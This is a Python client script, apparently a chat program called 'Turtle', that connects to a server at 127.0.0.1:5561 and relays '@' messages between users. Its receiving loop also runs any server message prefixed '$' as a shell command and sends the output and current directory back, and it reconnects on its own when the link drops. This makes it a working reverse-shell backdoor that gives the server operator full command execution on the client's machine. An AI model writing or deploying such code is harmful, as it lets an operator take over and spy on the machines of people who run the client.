import socket
import sys
import os
import subprocess
import threading
from queue import Queue
import time

host = '127.0.0.1'
port = 5561
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
TTL = 10
name = ""
title = ""

def connect_to_server():
    global TTL
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            return s
        except:
            print('Unable to connect to server. Waiting to connect. TTL = ' + str(TTL))
            TTL -= 1
            time.sleep(5)


s = connect_to_server()
print('Connected to the server')
data = s.recv(1024)
CLIENT_ID = int(data)



def receive_data(s):
    while True:
        #print('Inside the Thread - recieve data()')
        data = s.recv(1024)
        data = data.decode('utf-8')
        #print('Received' + str(data))
        if not data:
            print('Server was reset or closed. \n Waiting to connect to the server')
            s = connect_to_server()
        elif(data[:2] == 'cd'):
            os.chdir(data[3:])
            print('directory changed')
        elif(len(data) > 0 and data[0] == '@'):
            l = len(data.split(' ')[0])
            print(str(data[0:l]) + '> ')
            print(data[l + 1:])
        elif(len(data) > 0 and data[0] == '$'):
            data = data[1:]
            print('Command Received')
            cmd = subprocess.Popen(data[:],  shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
            output = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output, 'utf-8')
            currentWD = os.getcwd() + '>'
            #print(output_str)
            s.send(str.encode(output_str + currentWD))
            print(output_str)
        else:
            #print('root> ', end = "")
            print(data)
            

def send_data(s):
    while True:
        #print('Inside the Thread - send data()')
        message = input('> ')
        if(message[0] == '@' and message.split(' ')[0][1:] == CLIENT_ID):
            print("You can't send message to yourself")
        else:
            s.send(str.encode(message))





def create_workers():
    for _ in range(NUMBER_OF_THREADS):
            t = threading.Thread(target = work)
            t.daemon = True
            t.start()

def create_jobs():
    for i in JOB_NUMBER:
        queue.put(i)
    queue.join()


# Do next job that is in the queue (handle connections, send commands)
def work():
    global name
    while True:
        x = queue.get()
        if(x == 1):
            receive_data(s)
        elif(x==2):
            name = input('Turtle> Type your name>>')
            s.send(str.encode(name))
            title = "title Client: " + str(CLIENT_ID) + " - " + name
            cmd = subprocess.Popen(title[:],  shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
            send_data(s)
        queue.task_done()


create_workers()
create_jobs()

